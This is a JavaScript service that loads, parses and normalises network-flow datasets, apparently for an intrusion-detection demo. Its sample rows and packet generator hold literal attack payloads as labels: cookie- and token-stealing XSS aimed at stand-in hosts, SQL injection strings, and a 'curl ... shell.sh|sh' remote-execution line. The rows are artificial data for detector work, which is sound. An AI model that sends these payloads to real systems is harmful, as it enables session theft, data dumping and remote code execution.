/**
 * Dataset Ingestion & Preprocessing Pipeline Service
 * Handles CSV/JSON file uploads, preset benchmarks, schema validation, and 4-stage data preprocessing.
 */

const DEFAULT_DATASETS = [
  {
    id: "cicids_2017",
    name: "CICIDS-2017 Network Flow Benchmark",
    description: "Realistic enterprise network intrusion capture containing multi-vector DDoS, Port Scanning, and Botnet traffic.",
    recordsCount: 120,
    features: ["Source_IP", "Dest_IP", "Source_Port", "Dest_Port", "Protocol", "Flow_Duration_ms", "Total_Fwd_Packets", "Total_Bwd_Packets", "Packet_Length_Mean", "Packet_Entropy", "SYN_Flag_Count", "ACK_Flag_Count", "Payload_Signature", "Actual_Label"],
    sampleRows: [
      { id: "PKT-10941", Source_IP: "192.168.10.50", Dest_IP: "172.16.0.1", Source_Port: 49152, Dest_Port: 80, Protocol: "TCP", Flow_Duration_ms: 1420, Total_Fwd_Packets: 1250, Total_Bwd_Packets: 4, Packet_Length_Mean: 64.0, Packet_Entropy: 2.15, SYN_Flag_Count: 1248, ACK_Flag_Count: 0, Payload_Signature: "SYN_FLOOD_ANOMALY_SEQ_0x89FA", Actual_Label: "DDoS Attack" },
      { id: "PKT-10942", Source_IP: "10.0.0.15", Dest_IP: "10.0.0.100", Source_Port: 52110, Dest_Port: 443, Protocol: "TCP", Flow_Duration_ms: 450, Total_Fwd_Packets: 18, Total_Bwd_Packets: 22, Packet_Length_Mean: 840.5, Packet_Entropy: 7.82, SYN_Flag_Count: 1, ACK_Flag_Count: 38, Payload_Signature: "TLS_1_3_APP_DATA_CIPHER_GCM", Actual_Label: "Benign Traffic" },
      { id: "PKT-10943", Source_IP: "198.51.100.44", Dest_IP: "10.0.0.5", Source_Port: 38290, Dest_Port: 445, Protocol: "TCP", Flow_Duration_ms: 8900, Total_Fwd_Packets: 85, Total_Bwd_Packets: 72, Packet_Length_Mean: 1240.2, Packet_Entropy: 7.98, SYN_Flag_Count: 1, ACK_Flag_Count: 150, Payload_Signature: "SMB2_TREE_CONNECT_EXPLOIT_ETERNALBLUE", Actual_Label: "Ransomware / C2" },
      { id: "PKT-10944", Source_IP: "203.0.113.88", Dest_IP: "10.0.0.2", Source_Port: 60124, Dest_Port: 3306, Protocol: "TCP", Flow_Duration_ms: 230, Total_Fwd_Packets: 12, Total_Bwd_Packets: 8, Packet_Length_Mean: 340.0, Packet_Entropy: 5.62, SYN_Flag_Count: 1, ACK_Flag_Count: 18, Payload_Signature: "UNION SELECT username, password_hash FROM admin--", Actual_Label: "SQL Injection" },
      { id: "PKT-10945", Source_IP: "185.220.101.5", Dest_IP: "10.0.0.1", Source_Port: 41200, Dest_Port: 22, Protocol: "TCP", Flow_Duration_ms: 15200, Total_Fwd_Packets: 420, Total_Bwd_Packets: 410, Packet_Length_Mean: 98.4, Packet_Entropy: 4.12, SYN_Flag_Count: 15, ACK_Flag_Count: 810, Payload_Signature: "SSH_AUTH_FAIL_CYCLIC_WORDLIST_ROOT", Actual_Label: "Brute Force" },
      { id: "PKT-10946", Source_IP: "45.33.32.156", Dest_IP: "10.0.0.1", Source_Port: 58900, Dest_Port: 8080, Protocol: "TCP", Flow_Duration_ms: 45, Total_Fwd_Packets: 2, Total_Bwd_Packets: 1, Packet_Length_Mean: 44.0, Packet_Entropy: 1.90, SYN_Flag_Count: 2, ACK_Flag_Count: 0, Payload_Signature: "NMAP_SYN_STEALTH_PROBE_T4", Actual_Label: "Port Scanning" },
      { id: "PKT-10947", Source_IP: "194.26.29.112", Dest_IP: "10.0.0.80", Source_Port: 51000, Dest_Port: 80, Protocol: "HTTP", Flow_Duration_ms: 110, Total_Fwd_Packets: 6, Total_Bwd_Packets: 4, Packet_Length_Mean: 512.0, Packet_Entropy: 6.10, SYN_Flag_Count: 1, ACK_Flag_Count: 9, Payload_Signature: "<script>fetch('https://evil.io/steal?c='+document.cookie)</script>", Actual_Label: "Cross-Site Scripting (XSS)" }
    ]
  },
  {
    id: "web_waf_attacks",
    name: "Cloud WAF & API Threat Stream",
    description: "High-volume Layer 7 Application & API vulnerability exploit payloads.",
    recordsCount: 95,
    features: ["Source_IP", "Dest_IP", "Source_Port", "Dest_Port", "Protocol", "Flow_Duration_ms", "Total_Fwd_Packets", "Total_Bwd_Packets", "Packet_Length_Mean", "Packet_Entropy", "SYN_Flag_Count", "ACK_Flag_Count", "Payload_Signature", "Actual_Label"],
    sampleRows: [
      { id: "WAF-4001", Source_IP: "103.251.167.20", Dest_IP: "10.0.0.80", Source_Port: 43210, Dest_Port: 443, Protocol: "HTTPS", Flow_Duration_ms: 85, Total_Fwd_Packets: 4, Total_Bwd_Packets: 2, Packet_Length_Mean: 612.0, Packet_Entropy: 6.89, SYN_Flag_Count: 1, ACK_Flag_Count: 5, Payload_Signature: "GET /products?category=1' OR SLEEP(15)-- HTTP/1.1", Actual_Label: "SQL Injection" },
      { id: "WAF-4002", Source_IP: "185.190.140.22", Dest_IP: "10.0.0.80", Source_Port: 51200, Dest_Port: 80, Protocol: "HTTP", Flow_Duration_ms: 120, Total_Fwd_Packets: 5, Total_Bwd_Packets: 3, Packet_Length_Mean: 780.0, Packet_Entropy: 7.10, SYN_Flag_Count: 1, ACK_Flag_Count: 7, Payload_Signature: "POST /search?q=<img src=x onerror=this.src='https://attacker.xyz/?k='+localStorage.getItem('token')>", Actual_Label: "Cross-Site Scripting (XSS)" },
      { id: "WAF-4003", Source_IP: "62.210.180.99", Dest_IP: "10.0.0.80", Source_Port: 39912, Dest_Port: 80, Protocol: "HTTP", Flow_Duration_ms: 450, Total_Fwd_Packets: 12, Total_Bwd_Packets: 4, Packet_Length_Mean: 1850.0, Packet_Entropy: 7.84, SYN_Flag_Count: 1, ACK_Flag_Count: 15, Payload_Signature: "POST /api/upload?cmd=curl+http://185.x.x.x/shell.sh|sh", Actual_Label: "Remote Code Execution (RCE)" }
    ]
  },
  {
    id: "c2_ransomware_telemetry",
    name: "Advanced Ransomware & C2 Infrastructure",
    description: "Endpoint telemetry detailing Cobalt Strike beaconing, lateral SMB propagation, and exfiltration channels.",
    recordsCount: 80,
    features: ["Source_IP", "Dest_IP", "Source_Port", "Dest_Port", "Protocol", "Flow_Duration_ms", "Total_Fwd_Packets", "Total_Bwd_Packets", "Packet_Length_Mean", "Packet_Entropy", "SYN_Flag_Count", "ACK_Flag_Count", "Payload_Signature", "Actual_Label"],
    sampleRows: [
      { id: "C2-8812", Source_IP: "10.0.2.14", Dest_IP: "185.100.87.19", Source_Port: 49210, Dest_Port: 443, Protocol: "HTTPS", Flow_Duration_ms: 120000, Total_Fwd_Packets: 120, Total_Bwd_Packets: 118, Packet_Length_Mean: 340.0, Packet_Entropy: 7.99, SYN_Flag_Count: 1, ACK_Flag_Count: 235, Payload_Signature: "COBALT_STRIKE_PIPE_STATUS_STAGE2_BEACON", Actual_Label: "Ransomware / C2" },
      { id: "C2-8813", Source_IP: "10.0.2.14", Dest_IP: "10.0.2.105", Source_Port: 51023, Dest_Port: 445, Protocol: "SMB", Flow_Duration_ms: 3200, Total_Fwd_Packets: 320, Total_Bwd_Packets: 290, Packet_Length_Mean: 1420.0, Packet_Entropy: 7.91, SYN_Flag_Count: 1, ACK_Flag_Count: 605, Payload_Signature: "ADMIN$_REMOTE_ENCRYPTED_PAYLOAD_DROPPER", Actual_Label: "Ransomware / C2" }
    ]
  }
];

class DatasetService {
  constructor() {
    this.datasets = DEFAULT_DATASETS;
    this.activeDataset = this.datasets[0];
    this.activeRows = JSON.parse(JSON.stringify(this.activeDataset.sampleRows || []));
    this.preprocessedData = null;
    this.currentStep = 1;
  }

  async init() {
    try {
      const resp = await fetch('data/sample-datasets.json');
      if (resp.ok) {
        const data = await resp.json();
        if (data.datasets && data.datasets.length > 0) {
          this.datasets = data.datasets;
          this.selectDataset(this.datasets[0].id);
        }
      }
    } catch (e) {
      // Use pre-bundled constant datasets
    }
  }

  selectDataset(datasetId) {
    const found = this.datasets.find(d => d.id === datasetId);
    if (found) {
      this.activeDataset = found;
      this.activeRows = JSON.parse(JSON.stringify(found.sampleRows || []));
      this.runPreprocessingPipeline();
      return true;
    }
    return false;
  }

  parseCSV(csvText) {
    const lines = csvText.trim().split('\n');
    if (lines.length < 2) throw new Error('Invalid CSV file: insufficient lines.');

    const headers = lines[0].split(',').map(h => h.trim().replace(/^["']|["']$/g, ''));
    const rows = [];

    for (let i = 1; i < lines.length; i++) {
      if (!lines[i].trim()) continue;
      const values = lines[i].split(',').map(v => v.trim().replace(/^["']|["']$/g, ''));
      const obj = {};
      headers.forEach((h, idx) => {
        obj[h] = values[idx] !== undefined ? values[idx] : '';
      });
      if (!obj.id) obj.id = `CUSTOM-PKT-${1000 + i}`;
      rows.push(obj);
    }

    const newDataset = {
      id: `custom_${Date.now()}`,
      name: `Uploaded Custom Dataset (${rows.length} records)`,
      description: 'User-provided network traffic flow log ingestion.',
      recordsCount: rows.length,
      sampleRows: rows
    };

    this.datasets.unshift(newDataset);
    this.selectDataset(newDataset.id);
    return newDataset;
  }

  runPreprocessingPipeline() {
    if (!this.activeRows || this.activeRows.length === 0) return null;

    const cleaned = this.activeRows.map(r => ({
      id: r.id || 'PKT-AUTO',
      Source_IP: r.Source_IP || '127.0.0.1',
      Dest_IP: r.Dest_IP || '10.0.0.1',
      Source_Port: parseInt(r.Source_Port) || 8080,
      Dest_Port: parseInt(r.Dest_Port) || 80,
      Protocol: (r.Protocol || 'TCP').toUpperCase(),
      Flow_Duration_ms: parseFloat(r.Flow_Duration_ms) || 100,
      Total_Fwd_Packets: parseFloat(r.Total_Fwd_Packets) || 1,
      Total_Bwd_Packets: parseFloat(r.Total_Bwd_Packets) || 0,
      Packet_Length_Mean: parseFloat(r.Packet_Length_Mean) || 64,
      Packet_Entropy: parseFloat(r.Packet_Entropy) || 4.0,
      SYN_Flag_Count: parseInt(r.SYN_Flag_Count) || 0,
      ACK_Flag_Count: parseInt(r.ACK_Flag_Count) || 0,
      Payload_Signature: r.Payload_Signature || 'RAW_PAYLOAD_CHUNK_DEFAULT',
      Actual_Label: r.Actual_Label || 'Unlabeled'
    }));

    const encoded = cleaned.map(r => {
      const protoCode = r.Protocol === 'TCP' ? 1 : r.Protocol === 'UDP' ? 2 : r.Protocol === 'HTTPS' ? 3 : 4;
      return {
        ...r,
        Protocol_Encoded: protoCode,
        Is_WellKnown_Port: r.Dest_Port <= 1024 ? 1 : 0
      };
    });

    const maxDuration = Math.max(...encoded.map(r => r.Flow_Duration_ms), 1000);
    const maxFwd = Math.max(...encoded.map(r => r.Total_Fwd_Packets), 100);
    const maxPktLen = Math.max(...encoded.map(r => r.Packet_Length_Mean), 1500);

    const normalized = encoded.map(r => ({
      ...r,
      Scaled_Flow_Duration: parseFloat((r.Flow_Duration_ms / maxDuration).toFixed(4)),
      Scaled_Fwd_Packets: parseFloat((r.Total_Fwd_Packets / maxFwd).toFixed(4)),
      Scaled_Packet_Length: parseFloat((r.Packet_Length_Mean / maxPktLen).toFixed(4)),
      Scaled_Entropy: parseFloat((r.Packet_Entropy / 8.0).toFixed(4)),
      SYN_to_ACK_Ratio: parseFloat((r.SYN_Flag_Count / Math.max(1, r.SYN_Flag_Count + r.ACK_Flag_Count)).toFixed(3))
    }));

    const ready = normalized.map(r => {
      const isOutlier = r.Scaled_Entropy > 0.95 || r.Scaled_Fwd_Packets > 0.9;
      return {
        ...r,
        Outlier_Flag: isOutlier ? 'ANOMALOUS_OUTLIER' : 'IN_DISTRIBUTION'
      };
    });

    this.preprocessedData = {
      raw: this.activeRows,
      cleaned: cleaned,
      encoded: encoded,
      normalized: ready
    };

    return this.preprocessedData;
  }

  generateLivePacket() {
    const templates = [
      { category: 'DDoS Attack', src: '185.122.50.' + Math.floor(Math.random()*254), dst: '10.0.0.1', port: 80, proto: 'TCP', payload: 'SYN_FLOOD_VOLUMETRIC_0x' + Math.floor(Math.random()*65535).toString(16), fwd: 800 + Math.floor(Math.random()*1500), entropy: 2.1, syn: 1200 },
      { category: 'SQL Injection', src: '203.0.113.' + Math.floor(Math.random()*254), dst: '10.0.0.80', port: 443, proto: 'HTTPS', payload: "GET /api/user?id=1 UNION SELECT 1,schema_name,3 FROM information_schema.schemata--", fwd: 6, entropy: 5.8, syn: 1 },
      { category: 'Cross-Site Scripting (XSS)', src: '194.26.29.' + Math.floor(Math.random()*254), dst: '10.0.0.80', port: 80, proto: 'HTTP', payload: "<script>document.location='http://attacker.xyz/steal?c='+document.cookie</script>", fwd: 5, entropy: 6.4, syn: 1 },
      { category: 'Ransomware / C2', src: '185.100.87.' + Math.floor(Math.random()*254), dst: '10.0.2.14', port: 8443, proto: 'TCP', payload: "COBALT_STRIKE_JITTER_ENCRYPTED_BEACON_V4", fwd: 110, entropy: 7.95, syn: 1 },
      { category: 'Brute Force', src: '91.240.118.' + Math.floor(Math.random()*254), dst: '10.0.0.22', port: 22, proto: 'TCP', payload: "SSH-2.0-OpenSSH_CYCLIC_BRUTE_FORCE_ADMIN_DICT", fwd: 320, entropy: 4.2, syn: 15 },
      { category: 'Benign Traffic', src: '10.0.0.' + Math.floor(Math.random()*254), dst: '172.217.16.206', port: 443, proto: 'HTTPS', payload: "TLS_1_3_APPLICATION_DATA_BENIGN_SESSION", fwd: 14, entropy: 7.2, syn: 1 }
    ];

    const pick = templates[Math.floor(Math.random() * templates.length)];
    return {
      id: `PKT-${Math.floor(10000 + Math.random() * 90000)}`,
      Source_IP: pick.src,
      Dest_IP: pick.dst,
      Source_Port: Math.floor(30000 + Math.random() * 30000),
      Dest_Port: pick.port,
      Protocol: pick.proto,
      Flow_Duration_ms: Math.floor(50 + Math.random() * 2000),
      Total_Fwd_Packets: pick.fwd,
      Total_Bwd_Packets: Math.floor(pick.fwd / 2),
      Packet_Length_Mean: Math.floor(64 + Math.random() * 800),
      Packet_Entropy: pick.entropy,
      SYN_Flag_Count: pick.syn || 1,
      ACK_Flag_Count: Math.floor(Math.random() * 10),
      Payload_Signature: pick.payload,
      Actual_Label: pick.category
    };
  }
}

window.datasetService = new DatasetService();
